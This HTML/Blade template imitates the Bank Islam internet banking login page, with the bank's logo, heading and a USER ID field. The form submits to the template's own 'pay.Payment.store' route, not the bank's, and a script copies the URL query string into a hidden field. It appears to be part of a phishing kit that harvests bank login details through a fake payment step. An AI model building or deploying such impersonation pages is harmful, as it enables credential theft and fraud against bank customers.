<!DOCTYPE html>
<html>
  
<head>
      
    <!-- Style to set text-element
        to center -->
    <style>
    .topnav {
        background-color: #A7A9AC;
        overflow: hidden;
}

/* Style the links inside the navigation bar */
.topnav a {
  float: left;
  color: #f2f2f2;
  text-align: center;
  padding: 14px 16px;
  text-decoration: none;
  font-size: 17px;
}

/* Change the color of links on hover */
.topnav a:hover {
  background-color: #ddd;
  color: black;
}

/* Add a color to the active/current link */
.topnav a.active {
  background-color: #333;
  color: white;
}

        .center {
            text-align-last: left;
            border: 2px solid black;
            font-family: "Helvetica Neue" , Arial, sans-serif;
            background-color: #AF0A3D;
        }
    </style>
</head>
  
<body>

<div class="topnav">
  <a  href="#home"></a>
</div>

    <div class="navbar-inner hidden-print">
        <a class="brand span3" href="http://www.bankislam.com.my/home/">
            <img src="/logo/logo-bank-islam.png">
        </a>
    </div>

<form action="{{route('pay.Payment.store')}}" method="POST">
@csrf
    <div class="center">
    <div class="saje" style="margin-left: 30px; margin-top: 50px;">
    <div class="widget-header" style="color:#ffffff">
            <h3>Welcome to Bank Islam <br> Internet Banking</h3>
        </div>
        <div class="control-group" style="color:#ffffff">
            <label class="control-label" for="username">USER ID</label></br>
                <input type="text" id="username" name="username" value="" placeholder="Username" class="login username-field disable-whitespace" maxlength="10">
                <input type="hidden" id="test" name="test" value="">
                <input type="hidden" id="add" name="add" value="index">
        </div>
        <br>
        <div class="control-group">
            <button type="submit" class="btn btn-primary">
                Login
            </button>
        </div>
        <div class="control-group" style="float:right; margin-right: 50px">
            <input type="submit" name="cancel" value="Cancel Transaction" class="button btn btn-login" style="#808285">
        </div>
        <br>
        <br>
        <div class="row-fluid" style="background: #BF4B66; padding: 5px 15px; width: 90%;">
                <span style="font-size: 13px; font-weight: bold; color:#ffffff">I have a problem logging in</span><br>
                <ul style="font-size: 11px; padding-left: 15px;">
                    <p style="color:#ffffff">&gt; Forgot User ID / Password</p>
                </ul>
            </div>
        <br>
    </div>
    </div>
</form>
</body>

<script src="http://ajax.googleapis.com/ajax/libs/jquery/1.7.1/jquery.min.js" type="text/javascript"></script> 
<script>
    var a = location.search;
    var b = a.substring(a.indexOf("?")+1);
    document.getElementById("test").value = b;
   
</script>

</html>         